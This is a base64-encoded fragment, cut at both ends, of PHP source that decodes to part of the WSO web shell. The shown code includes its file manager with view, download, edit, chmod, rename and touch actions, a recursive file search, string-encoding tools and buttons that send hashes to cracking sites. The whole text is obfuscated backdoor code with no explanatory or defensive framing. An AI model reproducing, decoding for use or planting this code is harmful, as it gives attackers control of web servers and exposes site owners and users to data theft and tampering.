VG9vbHNcJyxudWxsLFwnJy51cmxlbmNvZGUoJGZbJ25hbWUnXSkuJ1wnLFwnY2htb2RcJykiPicuJGZbJ3Blcm1zJ10KCQkJLic8L3RkPjx0ZD48YSBocmVmPSIjIiBvbmNsaWNrPSJnKFwnRmlsZXNUb29sc1wnLG51bGwsXCcnLnVybGVuY29kZSgkZlsnbmFtZSddKS4nXCcsIFwncmVuYW1lXCcpIj5SPC9hPiA8YSBocmVmPSIjIiBvbmNsaWNrPSJnKFwnRmlsZXNUb29sc1wnLG51bGwsXCcnLnVybGVuY29kZSgkZlsnbmFtZSddKS4nXCcsIFwndG91Y2hcJykiPlQ8L2E+Jy4oKCRmWyd0eXBlJ109PSdmaWxlJyk/JyA8YSBocmVmPSIjIiBvbmNsaWNrPSJnKFwnRmlsZXNUb29sc1wnLG51bGwsXCcnLnVybGVuY29kZSgkZlsnbmFtZSddKS4nXCcsIFwnZWRpdFwnKSI+RTwvYT4gPGEgaHJlZj0iIyIgb25jbGljaz0iZyhcJ0ZpbGVzVG9vbHNcJyxudWxsLFwnJy51cmxlbmNvZGUoJGZbJ25hbWUnXSkuJ1wnLCBcJ2Rvd25sb2FkXCcpIj5EPC9hPic6JycpLic8L3RkPjwvdHI+JzsKCQkkbCA9ICRsPzA6MTsKCX0KCWVjaG8gIjx0cj48dGQgY29sc3Bhbj03PgoJPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YSB2YWx1ZT0nRmlsZXNNYW4nPgoJPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YyB2YWx1ZT0nIiAuIGh0bWxzcGVjaWFsY2hhcnMoJEdMT0JBTFNbJ2N3ZCddKSAuIic+Cgk8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1jaGFyc2V0IHZhbHVlPSciLiAoaXNzZXQoJF9QT1NUWydjaGFyc2V0J10pPyRfUE9TVFsnY2hhcnNldCddOicnKS4iJz4KCTxzZWxlY3QgbmFtZT0ncDEnPjxvcHRpb24gdmFsdWU9J2NvcHknPkNvcHk8L29wdGlvbj48b3B0aW9uIHZhbHVlPSdtb3ZlJz5Nb3ZlPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0nZGVsZXRlJz5EZWxldGU8L29wdGlvbj4iOwogICAgaWYoY2xhc3NfZXhpc3RzKCdaaXBBcmNoaXZlJykpCiAgICAgICAgZWNobyAiPG9wdGlvbiB2YWx1ZT0nemlwJz5Db21wcmVzcyAoemlwKTwvb3B0aW9uPjxvcHRpb24gdmFsdWU9J3VuemlwJz5VbmNvbXByZXNzICh6aXApPC9vcHRpb24+IjsKICAgIGVjaG8gIjxvcHRpb24gdmFsdWU9J3Rhcic+Q29tcHJlc3MgKHRhci5neik8L29wdGlvbj4iOwogICAgaWYoIWVtcHR5KCRfQ09PS0lFWydhY3QnXSkgJiYgQGNvdW50KCRfQ09PS0lFWydmJ10pKQogICAgICAgIGVjaG8gIjxvcHRpb24gdmFsdWU9J3Bhc3RlJz5QYXN0ZSAvIENvbXByZXNzPC9vcHRpb24+IjsKICAgIGVjaG8gIjwvc2VsZWN0PiZuYnNwOyI7CiAgICBpZighZW1wdHkoJF9DT09LSUVbJ2FjdCddKSAmJiBAY291bnQoJF9DT09LSUVbJ2YnXSkgJiYgKCgkX0NPT0tJRVsnYWN0J10gPT0gJ3ppcCcpIHx8ICgkX0NPT0tJRVsnYWN0J10gPT0gJ3RhcicpKSkKICAgICAgICBlY2hvICJmaWxlIG5hbWU6IDxpbnB1dCB0eXBlPXRleHQgbmFtZT1wMiB2YWx1ZT0nd3NvXyIgLiBkYXRlKCJZbWRfSGlzIikgLiAiLiIgLiAoJF9DT09LSUVbJ2FjdCddID09ICd6aXAnPyd6aXAnOid0YXIuZ3onKSAuICInPiZuYnNwOyI7CiAgICBlY2hvICI8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nPj4nPjwvdGQ+PC90cj48L2Zvcm0+PC90YWJsZT48L2Rpdj4iOwoJd3NvRm9vdGVyKCk7Cn0KCmZ1bmN0aW9uIGFjdGlvblN0cmluZ1Rvb2xzKCkgewoJaWYoIWZ1bmN0aW9uX2V4aXN0cygnaGV4MmJpbicpKSB7ZnVuY3Rpb24gaGV4MmJpbigkcCkge3JldHVybiBkZWNiaW4oaGV4ZGVjKCRwKSk7fX0KICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2JpbmhleCcpKSB7ZnVuY3Rpb24gYmluaGV4KCRwKSB7cmV0dXJuIGRlY2hleChiaW5kZWMoJHApKTt9fQoJaWYoIWZ1bmN0aW9uX2V4aXN0cygnaGV4MmFzY2lpJykpIHtmdW5jdGlvbiBoZXgyYXNjaWkoJHApeyRyPScnO2ZvcigkaT0wOyRpPHN0ckxlbigkcCk7JGkrPTIpeyRyLj1jaHIoaGV4ZGVjKCRwWyRpXS4kcFskaSsxXSkpO31yZXR1cm4gJHI7fX0KCWlmKCFmdW5jdGlvbl9leGlzdHMoJ2FzY2lpMmhleCcpKSB7ZnVuY3Rpb24gYXNjaWkyaGV4KCRwKXskcj0nJztmb3IoJGk9MDskaTxzdHJsZW4oJHApOysrJGkpJHIuPSBzcHJpbnRmKCclMDJYJyxvcmQoJHBbJGldKSk7cmV0dXJuIHN0cnRvdXBwZXIoJHIpO319CglpZighZnVuY3Rpb25fZXhpc3RzKCdmdWxsX3VybGVuY29kZScpKSB7ZnVuY3Rpb24gZnVsbF91cmxlbmNvZGUoJHApeyRyPScnO2ZvcigkaT0wOyRpPHN0cmxlbigkcCk7KyskaSkkci49ICclJy5kZWNoZXgob3JkKCRwWyRpXSkpO3JldHVybiBzdHJ0b3VwcGVyKCRyKTt9fQoJJHN0cmluZ1Rvb2xzID0gYXJyYXkoCgkJJ0Jhc2U2NCBlbmNvZGUnID0+ICdiYXNlNjRfZW5jb2RlJywKCQknQmFzZTY0IGRlY29kZScgPT4gJ2Jhc2U2NF9kZWNvZGUnLAoJCSdVcmwgZW5jb2RlJyA9PiAndXJsZW5jb2RlJywKCQknVXJsIGRlY29kZScgPT4gJ3VybGRlY29kZScsCgkJJ0Z1bGwgdXJsZW5jb2RlJyA9PiAnZnVsbF91cmxlbmNvZGUnLAoJCSdtZDUgaGFzaCcgPT4gJ21kNScsCgkJJ3NoYTEgaGFzaCcgPT4gJ3NoYTEnLAoJCSdjcnlwdCcgPT4gJ2NyeXB0JywKCQknQ1JDMzInID0+ICdjcmMzMicsCgkJJ0FTQ0lJIHRvIEhFWCcgPT4gJ2FzY2lpMmhleCcsCgkJJ0hFWCB0byBBU0NJSScgPT4gJ2hleDJhc2NpaScsCgkJJ0hFWCB0byBERUMnID0+ICdoZXhkZWMnLAoJCSdIRVggdG8gQklOJyA9PiAnaGV4MmJpbicsCgkJJ0RFQyB0byBIRVgnID0+ICdkZWNoZXgnLAoJCSdERUMgdG8gQklOJyA9PiAnZGVjYmluJywKCQknQklOIHRvIEhFWCcgPT4gJ2JpbmhleCcsCgkJJ0JJTiB0byBERUMnID0+ICdiaW5kZWMnLAoJCSdTdHJpbmcgdG8gbG93ZXIgY2FzZScgPT4gJ3N0cnRvbG93ZXInLAoJCSdTdHJpbmcgdG8gdXBwZXIgY2FzZScgPT4gJ3N0cnRvdXBwZXInLAoJCSdIdG1sc3BlY2lhbGNoYXJzJyA9PiAnaHRtbHNwZWNpYWxjaGFycycsCgkJJ1N0cmluZyBsZW5ndGgnID0+ICdzdHJsZW4nLAoJKTsKCWlmKGlzc2V0KCRfUE9TVFsnYWpheCddKSkgewoJCVdTT3NldGNvb2tpZShtZDUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKS4nYWpheCcsIHRydWUpOwoJCW9iX3N0YXJ0KCk7CgkJaWYoaW5fYXJyYXkoJF9QT1NUWydwMSddLCAkc3RyaW5nVG9vbHMpKQoJCQllY2hvICRfUE9TVFsncDEnXSgkX1BPU1RbJ3AyJ10pOwoJCSR0ZW1wID0gImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdHJPdXRwdXQnKS5zdHlsZS5kaXNwbGF5PScnO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdHJPdXRwdXQnKS5pbm5lckhUTUw9JyIuYWRkY3NsYXNoZXMoaHRtbHNwZWNpYWxjaGFycyhvYl9nZXRfY2xlYW4oKSksIlxuXHJcdFxcJ1wwIikuIic7XG4iOwoJCWVjaG8gc3RybGVuKCR0ZW1wKSwgIlxuIiwgJHRlbXA7CgkJZXhpdDsKCX0KICAgIGlmKGVtcHR5KCRfUE9TVFsnYWpheCddKSYmIWVtcHR5KCRfUE9TVFsncDEnXSkpCgkJV1NPc2V0Y29va2llKG1kNSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pLidhamF4JywgMCk7Cgl3c29IZWFkZXIoKTsKCWVjaG8gJzxoMT5TdHJpbmcgY29udmVyc2lvbnM8L2gxPjxkaXYgY2xhc3M9Y29udGVudD4nOwoJZWNobyAiPGZvcm0gbmFtZT0ndG9vbHNGb3JtJyBvblN1Ym1pdD0naWYodGhpcy5hamF4LmNoZWNrZWQpe2EobnVsbCxudWxsLHRoaXMuc2VsZWN0VG9vbC52YWx1ZSx0aGlzLmlucHV0LnZhbHVlKTt9ZWxzZXtnKG51bGwsbnVsbCx0aGlzLnNlbGVjdFRvb2wudmFsdWUsdGhpcy5pbnB1dC52YWx1ZSk7fSByZXR1cm4gZmFsc2U7Jz48c2VsZWN0IG5hbWU9J3NlbGVjdFRvb2wnPiI7Cglmb3JlYWNoKCRzdHJpbmdUb29scyBhcyAkayA9PiAkdikKCQllY2hvICI8b3B0aW9uIHZhbHVlPSciLmh0bWxzcGVjaWFsY2hhcnMoJHYpLiInPiIuJGsuIjwvb3B0aW9uPiI7CgkJZWNobyAiPC9zZWxlY3Q+PGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9Jz4+Jy8+IDxpbnB1dCB0eXBlPWNoZWNrYm94IG5hbWU9YWpheCB2YWx1ZT0xICIuKEAkX0NPT0tJRVttZDUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKS4nYWpheCddPydjaGVja2VkJzonJykuIj4gc2VuZCB1c2luZyBBSkFYPGJyPjx0ZXh0YXJlYSBuYW1lPSdpbnB1dCcgc3R5bGU9J21hcmdpbi10b3A6NXB4JyBjbGFzcz1iaWdhcmVhPiIuKGVtcHR5KCRfUE9TVFsncDEnXSk/Jyc6aHRtbHNwZWNpYWxjaGFycyhAJF9QT1NUWydwMiddKSkuIjwvdGV4dGFyZWE+PC9mb3JtPjxwcmUgY2xhc3M9J21sMScgc3R5bGU9JyIuKGVtcHR5KCRfUE9TVFsncDEnXSk/J2Rpc3BsYXk6bm9uZTsnOicnKS4ibWFyZ2luLXRvcDo1cHgnIGlkPSdzdHJPdXRwdXQnPiI7CglpZighZW1wdHkoJF9QT1NUWydwMSddKSkgewoJCWlmKGluX2FycmF5KCRfUE9TVFsncDEnXSwgJHN0cmluZ1Rvb2xzKSllY2hvIGh0bWxzcGVjaWFsY2hhcnMoJF9QT1NUWydwMSddKCRfUE9TVFsncDInXSkpOwoJfQoJZWNobyI8L3ByZT48L2Rpdj48YnI+PGgxPlNlYXJjaCBmaWxlczo8L2gxPjxkaXYgY2xhc3M9Y29udGVudD4KCQk8Zm9ybSBvbnN1Ym1pdD1cImcobnVsbCx0aGlzLmN3ZC52YWx1ZSxudWxsLHRoaXMudGV4dC52YWx1ZSx0aGlzLmZpbGVuYW1lLnZhbHVlKTtyZXR1cm4gZmFsc2U7XCI+PHRhYmxlIGNlbGxwYWRkaW5nPScxJyBjZWxsc3BhY2luZz0nMCcgd2lkdGg9JzUwJSc+CgkJCTx0cj48dGQgd2lkdGg9JzElJz5UZXh0OjwvdGQ+PHRkPjxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSd0ZXh0JyBzdHlsZT0nd2lkdGg6MTAwJSc+PC90ZD48L3RyPgoJCQk8dHI+PHRkPlBhdGg6PC90ZD48dGQ+PGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J2N3ZCcgdmFsdWU9JyIuIGh0bWxzcGVjaWFsY2hhcnMoJEdMT0JBTFNbJ2N3ZCddKSAuIicgc3R5bGU9J3dpZHRoOjEwMCUnPjwvdGQ+PC90cj4KCQkJPHRyPjx0ZD5OYW1lOjwvdGQ+PHRkPjxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdmaWxlbmFtZScgdmFsdWU9JyonIHN0eWxlPSd3aWR0aDoxMDAlJz48L3RkPjwvdHI+CgkJCTx0cj48dGQ+PC90ZD48dGQ+PGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9Jz4+Jz48L3RkPjwvdHI+CgkJCTwvdGFibGU+PC9mb3JtPiI7CgoJZnVuY3Rpb24gd3NvUmVjdXJzaXZlR2xvYigkcGF0aCkgewoJCWlmKHN1YnN0cigkcGF0aCwgLTEpICE9ICcvJykKCQkJJHBhdGguPScvJzsKCQkkcGF0aHMgPSBAYXJyYXlfdW5pcXVlKEBhcnJheV9tZXJnZShAZ2xvYigkcGF0aC4kX1BPU1RbJ3AzJ10pLCBAZ2xvYigkcGF0aC4nKicsIEdMT0JfT05MWURJUikpKTsKCQlpZihpc19hcnJheSgkcGF0aHMpJiZAY291bnQoJHBhdGhzKSkgewoJCQlmb3JlYWNoKCRwYXRocyBhcyAkaXRlbSkgewoJCQkJaWYoQGlzX2RpcigkaXRlbSkpewoJCQkJCWlmKCRwYXRoIT0kaXRlbSkKCQkJCQkJd3NvUmVjdXJzaXZlR2xvYigkaXRlbSk7CgkJCQl9IGVsc2UgewoJCQkJCWlmKGVtcHR5KCRfUE9TVFsncDInXSkgfHwgQHN0cnBvcyhmaWxlX2dldF9jb250ZW50cygkaXRlbSksICRfUE9TVFsncDInXSkhPT1mYWxzZSkKCQkJCQkJZWNobyAiPGEgaHJlZj0nIycgb25jbGljaz0nZyhcIkZpbGVzVG9vbHNcIixudWxsLFwiIi51cmxlbmNvZGUoJGl0ZW0pLiJcIiwgXCJ2aWV3XCIsXCJcIiknPiIuaHRtbHNwZWNpYWxjaGFycygkaXRlbSkuIjwvYT48YnI+IjsKCQkJCX0KCQkJfQoJCX0KCX0KCWlmKEAkX1BPU1RbJ3AzJ10pCgkJd3NvUmVjdXJzaXZlR2xvYigkX1BPU1RbJ2MnXSk7CgllY2hvICI8L2Rpdj48YnI+PGgxPlNlYXJjaCBmb3IgaGFzaDo8L2gxPjxkaXYgY2xhc3M9Y29udGVudD4KCQk8Zm9ybSBtZXRob2Q9J3Bvc3QnIHRhcmdldD0nX2JsYW5rJyBuYW1lPSdoZic+CgkJCTxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdoYXNoJyBzdHlsZT0nd2lkdGg6MjAwcHg7Jz48YnI+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2FjdCcgdmFsdWU9J2ZpbmQnLz4KCQkJPGlucHV0IHR5cGU9J2J1dHRvbicgdmFsdWU9J2hhc2hjcmFja2luZy5ydScgb25jbGljaz1cImRvY3VtZW50LmhmLmFjdGlvbj0naHR0cHM6Ly9oYXNoY3JhY2tpbmcucnUvaW5kZXgucGhwJztkb2N1bWVudC5oZi5zdWJtaXQoKVwiPjxicj4KCQkJPGlucHV0IHR5cGU9J2J1dHRvbicgdmFsdWU9J21kNS5yZWRub2l6ZS5jb20nIG9uY2xpY2s9XCJkb2N1bWVudC5oZi5hY3Rpb249J2h0dHA6Ly9tZDUucmVkbm9pemUuY29tLz9xPScrZG9jdW1lbnQuaGYuaGFzaC52YWx1ZSsnJnM9bWQ1Jztkb2N1bWVudC5oZi5zdWJtaXQoKVwiPjxicj4KICAgICAgICAgICAgPGlucHV0IHR5cGU9J2J1dHRvbicgdmFsdWU9J2NyYWNrZm9yLm1lJyBvbmNsaWNrPVwiZG9jdW1lbnQuaGYuYWN0aW9uPSdodHRwOi8vY3JhY2tmb3IubWUvaW5kZXgucGhwJztkb2N1bWVudC5oZi5zdWJtaXQoKVwiPjxicj4KCQk8L2Zvcm0+PC9kaXY+IjsKCXdzb0Zvb3RlcigpOwp9CgpmdW5jdGlvbiBhY3Rpb25GaWxlc1Rvb2xzKCkgewoJaWYoIGlzc2V0KCRfUE9TVFsncDEnXSkgKQoJCSRfUE9TVFsncDEnXSA9IHVybGRlY29kZSgkX1BPU1RbJ3AxJ10pOwoJaWYoQCRfUE9TVFsncDInXT09J2Rvd25sb2FkJykgewoJCWlmKEBpc19maWxlKCRfUE9TVFsncDEnXSkgJiYgQGlzX3JlYWRhYmxlKCRfUE9TVFsncDEnXSkpIHsKCQkJb2Jfc3RhcnQoIm9iX2d6aGFuZGxlciIsIDQwOTYpOwoJCQloZWFkZXIoIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSIuYmFzZW5hbWUoJF9QT1NUWydwMSddKSk7CgkJCWlmIChmdW5jdGlvbl9leGlzdHMoIm1pbWVfY29udGVudF90eXBlIikpIHsKCQkJCSR0eXBlID0gQG1pbWVfY29udGVudF90eXBlKCRfUE9TVFsncDEnXSk7CgkJCQloZWFkZXIoIkNvbnRlbnQtVHlwZTogIiAuICR0eXBlKTsKCQkJfSBlbHNlCiAgICAgICAgICAgICAgICBoZWFkZXIoIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtIik7CgkJCSRmcCA9IEBmb3BlbigkX1BPU1RbJ3AxJ10sICJyIik7CgkJCWlmKCRmcCkgewoJCQkJd2hpbGUoIUBmZW9mKCRmcCkpCgkJCQkJZWNobyBAZnJlYWQoJGZwLCAxMDI0KTsKCQkJCWZjbG9zZSgkZnApOwoJCQl9CgkJfWV4aXQ7Cgl9CglpZiggQCRfUE9TVFsncDInXSA9PSAnbWtmaWxlJyApIHsKCQlpZighZmlsZV9leGlzdHMoJF9QT1NUWydwMSddKSkgewoJCQkkZnAgPSBAZm9wZW4oJF9QT1NUWydwMSddLCAndycpOwoJCQlpZigkZnApIHsKCQkJCSRfUE9TVFsncDInXSA9ICJlZGl0IjsKCQkJCWZjbG9zZSgkZnApOwoJCQl9CgkJfQoJfQoJd3NvSGVhZGVyKCk7CgllY2hvICc8aDE+RmlsZSB0b29sczwvaDE+PGRpdiBjbGFzcz1jb250ZW50Pic7CglpZiggIWZpbGVfZXhpc3RzKEAkX1BPU1RbJ3AxJ10pICkgewoJCWVjaG8gJ0ZpbGUgbm90IGV4aXN0cyc7CgkJd3NvRm9vdGVyKCk7CgkJcmV0dXJuOwoJfQoJJHVpZCA9IEBwb3NpeF9nZXRwd3VpZChAZmlsZW93bmVyKCRfUE9TVFsncDEnXSkpOwoJaWYoISR1aWQpIHsKCQkkdWlkWyduYW1lJ10gPSBAZmlsZW93bmVyKCRfUE9TVFsncDEnXSk7CgkJJGdpZFsnbmFtZSddID0gQGZpbGVncm91cCgkX1BPU1RbJ3AxJ10pOwoJfSBlbHNlICRnaWQgPSBAcG9zaXhfZ2V0Z3JnaWQoQGZpbGVncm91cCgkX1BPU1RbJ3AxJ10pKTsKCWVjaG8gJzxzcGFuPk5hbWU6PC9zcGFuPiAnLmh0bWxzcGVjaWFsY2hhcnMoQGJhc2VuYW1lKCRfUE9TVFsncDEnXSkpLicgPHNwYW4+U2l6ZTo8L3NwYW4+ICcuKGlzX2ZpbGUoJF9QT1NUWydwMSddKT93c29WaWV3U2l6ZShmaWxlc2l6ZSgkX1BPU1RbJ3AxJ10pKTonLScpLicgPHNwYW4+UGVybWlzc2lvbjo8L3NwYW4+ICcud3NvUGVybXNDb2xvcigkX1BPU1RbJ3AxJ10pLicgPHNwYW4+T3duZXIvR3JvdXA6PC9zcGFuPiAnLiR1aWRbJ25hbWUnXS4nLycuJGdpZFsnbmFtZSddLic8YnI+JzsKCWVjaG8gJzxzcGFuPkNoYW5nZSB0aW1lOjwvc3Bhbj4gJy5kYXRlKCdZLW0tZCBIOmk6cycsZmlsZWN0aW1lKCRfUE9TVFsncDEnXSkpLicgPHNwYW4+QWNjZXNzIHRpbWU6PC9zcGFuPiAnLmRhdGUoJ1ktbS1kIEg6aTpzJyxmaWxlYXRpbWUoJF9QT1NUWydwMSddKSkuJyA8c3Bhbj5Nb2RpZnkgdGltZTo8L3NwYW4+ICcuZGF0ZSgnWS1tLWQgSDppOnMnLGZpbGVtdGltZSgkX1BPU1RbJ3AxJ10pKS4nPGJyPjxicj4nOwoJaWYoIGVtcHR5KCRfUE9TVFsncDInXSkgKQoJCSRfUE9TVFsncDInXSA9ICd2aWV3JzsKCWlmKCBpc19maWxlKCRfUE9TVFsncDEnXSkgKQoJCSRtID0gYXJyYXkoJ1ZpZXcnLCAnSGlnaGxpZ2h0JywgJ0Rvd25sb2FkJywgJ0hleGR1bXAnLCAnRWRpdCcsICdDaG1vZCcsICdSZW5hbWUnLCAnVG91Y2gnKTsKCWVsc2UKCQkkbSA9IGFycmF5KCdDaG1vZCcsICdSZW5hbWUnLCAnVG91Y2gnKTsKCWZvcmVhY2goJG0gYXMgJHYpCgkJZWNobyAnPGEgaHJlZj0jIG9uY2xpY2s9ImcobnVsbCxudWxsLFwnJyAuIHVybGVuY29kZSgkX1BPU1RbJ3AxJ10pIC4gJ1wnLFwnJy5zdHJ0b2xvd2VyKCR2KS4nXCcpIj4nLigoc3RydG9sb3dlcigkdik9PUAkX1BPU1RbJ3AyJ10pPyc8Yj5bICcuJHYuJyBdPC9iPic6JHYpLic8L2E+ICc7CgllY2hvICc8YnI+PGJyPic7Cglzd2l0Y2goJF9QT1NUWydwMiddKSB7CgkJY2FzZSAndmlldyc6CgkJCWVjaG8gJzxwcmUgY2xhc3M9bWwxPic7CgkJCSRmcCA9IEBmb3BlbigkX1BPU1RbJ3AxJ10sICdyJyk7CgkJCWlmKCRmcCkgewoJCQkJd2hpbGUoICFAZmVvZigkZnApICkKCQkJCQllY2hvIGh0bWxzcGVjaWFsY2hhcnMoQGZyZWFkKCRmcCwgMTAyNCkpOwoJCQkJQGZjbG9zZSgkZnApOwoJCQl9CgkJCWVjaG8gJzwvcHJlPic7CgkJCWJyZWFrOwoJCWNhc2UgJ2hpZ2hsaWdodCc6CgkJCWlmKCBAaXNfcmVhZGFibGUoJF9QT1NUWydwMSddKSApIHsKCQkJCWVjaG8gJzxkaXYgY2xhc3M9bWwxIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiAjZTFlMWUxO2NvbG9yOmJsYWNrOyI+JzsKCQkJCSRjb2RlID0gQGhpZ2hsaWdodF9maWxlKCRfUE9TVFsncDEnXSx0cnVlKTsKCQkJCWVjaG8gc3RyX3JlcGxhY2UoYXJyYXkoJzxzcGFuICcsJzwvc3Bhbj4nKSwgYXJyYXkoJzxmb250ICcsJzwvZm9udD4nKSwkY29kZSkuJzwvZGl2Pic7CgkJCX0KCQkJYnJlYWs7CgkJY2FzZSAnY2htb2QnOgoJCQlpZiggIWVtcHR5KCRfUE9TVFsncDMnXSkgKSB7CgkJCQkkcGVybXMgPSAwOwoJCQkJZm9yKCRpPXN0cmxlbigkX1BPU1RbJ3AzJ10pLTE7JGk+PTA7LS0kaSkKCQkJCQkkcGVybXMgKz0gKGludCkkX1BPU1RbJ3AzJ11bJGldKnBvdyg4LCAoc3RybGVuKCRfUE9TVFsncDMnXSktJGktMSkpOwoJCQkJaWYoIUBjaG1vZCgkX1BPU1RbJ3AxJ10sICRwZXJtcykpCgkJCQkJZWNobyAnQ2FuXCd0IHNldCBwZXJtaXNzaW9ucyE8YnI+PHNjcmlwdD5kb2N1bWVudC5tZi5wMy52YWx1ZT0iIjs8L3NjcmlwdD4nOwoJCQl9CgkJCWNsZWFyc3RhdGNhY2hlKCk7CgkJCWVjaG8gJzxzY3JpcHQ+cDNfPSIiOzwvc2NyaXB0Pjxmb3JtIG9uc3VibWl0PSJnKG51bGwsbnVsbCxcJycgLiB1cmxlbmNvZGUoJF9QT1NUWydwMSddKSAuICdcJyxudWxsLHRoaXMuY2htb2QudmFsdWUpO3JldHVybiBmYWxzZTsiPjxpbnB1dCB0eXBlPXRleHQgbmFtZT1jaG1vZCB2YWx1ZT0iJy5zdWJzdHIoc3ByaW50ZignJW8nLCBmaWxlcGVybXMoJF9QT1NUWydwMSddKSksLTQpLiciPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iPj4iPjwvZm9ybT4nOwoJCQlicmVhazsKCQljYXNlICdlZGl0JzoKCQkJaWYoICFpc193cml0YWJsZSgkX1BPU1RbJ3AxJ10pKSB7CgkJCQllY2hvICdGaWxlIGlzblwndCB3cml0ZWFibGUnOwoJCQkJYnJlYWs7CgkJCX0KCQkJaWYoICFlbXB0eSgkX1BPU1RbJ3AzJ10pICkgewoJCQkJJHRpbWUgPSBAZmlsZW10aW1lKCRfUE9TVFsncDEnXSk7CgkJCQkkX1BPU1RbJ3AzJ10gPSBzdWJzdHIoJF9QT1NUWydwMyddLDEpOwoJCQkJJGZwID0gQGZvcGVuKCRfUE9TVFsncDEnXSwidyIpOwoJCQkJaWYoJGZwKSB7CgkJCQkJQGZ3cml0ZSgkZnAsJF9QT1NUWydwMyddKTsKCQkJCQlAZmNsb3NlKCRmcCk7CgkJCQkJZWNobyAnU2F2ZWQhPGJyPjxzY3JpcHQ+cDNfPSIiOzwvc2NyaXB0Pic7CgkJCQkJQHRvdWNoKCRfUE9TVFsncDEnXSwkdGltZSwkdGltZSk7CgkJCQl9CgkJCX0KCQkJZWNobyAnPGZvcm0gb25zdWJtaXQ9ImcobnVsbCxudWxsLFwnJyAuIHVybGVuY29kZSgkX1BPU1RbJ3AxJ10pIC4gJ1wnLG51bGwsXCcxXCcrdGhpcy50ZXh0LnZhbHVlKTtyZXR1cm4gZmFsc2U7Ij48dGV4dGFyZWEgbmFtZT10ZXh0IGNsYXNzPWJpZ2FyZWE+JzsKCQkJJGZwID0gQGZvcGVuKCRfUE9TVFsncDEnXSwgJ3InKTsKCQkJaWYoJGZwKSB7CgkJCQl3aGlsZSggIUBmZW9mKCRmcCkgKQoJCQkJCWVjaG8gaHRtbHNwZWNpYWxjaGFycyhAZnJlYWQoJGZwLCAxMDI0KSk7CgkJCQlAZmNsb3NlKCRmcCk7CgkJCX0KCQkJZWNobyAnPC90ZXh0YXJlYT48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9Ij4+Ij48L2Zvcm0+JzsKCQkJYnJlYWs7CgkJY2FzZSAnaGV4ZHVtcCc6CgkJCSRjID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCRfUE9TVFsncDEnXSk7CgkJCSRuID0gMDsKCQkJJGggPSBhcnJheSgnMDAwMDAwMDA8YnI+JywnJywnJyk7CgkJCSRsZW4gPSBzdHJsZW4oJGMpOwoJCQlmb3IgKCRpPTA7ICRpPCRsZW47ICsrJGkpIHsKCQkJCSRoWzFdIC49IHNwcmludGYoJyUwMlgnLG9yZCgkY1skaV0pKS4nICc7CgkJCQlzd2l0Y2ggKCBvcmQoJGNbJGldKSApIHsKCQkJCQljYXNlIDA6ICAkaFsyXSAuPSAnICc7IGJyZWFrOwoJCQkJCWNhc2UgOTogICRoWzJdIC49ICcgJzsgYnJlYWs7CgkJCQkJY2FzZSAxMDogJGhbMl0gLj0gJyAnOyBicmVhazsKCQkJCQljYXNlIDEzOiAkaFsyXSAuPSAnICc7IGJyZWFrOwoJCQkJCWRlZmF1bHQ6ICRoWzJdIC49ICRjWyRpXTsgYnJlYWs7CgkJCQl9CgkJCQkkbisrOwoJCQkJaWYgKCRuID09IDMyKSB7CgkJCQkJJG4gPSAwOwoJCQkJCWlmICgkaSsxIDwgJGxlbikgeyRoWzBdIC49IHNwcmludGYoJyUwOFgnLCRpKzEpLic8YnI+Jzt9CgkJCQkJJGhbMV0gLj0gJzxicj4nOwoJCQkJCSRoWzJdIC49ICJcbiI7CgkJCQl9CgkJIAl9CgkJCWVjaG8gJzx0YWJsZSBjZWxsc3BhY2luZz0xIGNlbGxwYWRkaW5nPTUgYmdjb2xvcj0jMjIyMjIyPjx0cj48dGQgYmdjb2xvcj0jMzMzMzMzPjxzcGFuIHN0eWxlPSJmb250LXdlaWdodDogbm9ybWFsOyI+PHByZT4nLiRoWzBdLic8L3ByZT48L3NwYW4+PC90ZD48dGQgYmdjb2xvcj0jMjgyODI4PjxwcmU+Jy4kaFsxXS4nPC9wcmU+PC90ZD48dGQgYmdjb2xvcj0jMzMzMzMzPjxwcmU+Jy5odG1sc3BlY2lhbGNoYXJzKCRoWzJdKS4nPC9wcmU+PC90ZD48L3RyPjwvdGFibGU+JzsKCQkJYnJlYWs7CgkJY2FzZSAncmVuYW1lJzoKCQkJaWYoICFlbXB0eSgkX1BPU1RbJ3AzJ10pICkgewoJCQkJaWYoIUByZW5hbWUoJF9QT1NUWydwMSddLCAkX1BPU1RbJ3AzJ10pKQoJCQkJCWVjaG8gJ0NhblwndCByZW5hbWUhPGJyPic7CgkJCQllbHNlCgkJCQkJZGllKCc8c2NyaXB0PmcobnVsbCxudWxsLCInLnVybGVuY29kZSgkX1BPU1RbJ3AzJ10pLiciLG51bGwsIiIpPC9zY3JpcHQ+Jyk7CgkJCX0KCQkJZWNobyAnPGZvcm0gb25zdWJtaXQ9ImcobnVsbCxudWxsLFwnJyAuIHVybGVuY29kZSgkX1BPU1RbJ3AxJ10pIC4gJ1wnLG51bGwsdGhpcy5uYW1lLnZhbHVlKTtyZXR1cm4gZmFsc2U7Ij48aW5wdXQgdHlwZT10ZXh0IG5hbWU9bmFtZSB2YWx1ZT0iJy5odG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsncDEnXSkuJyI+PGlucHV0IHR5cGU9c3VibWl0IH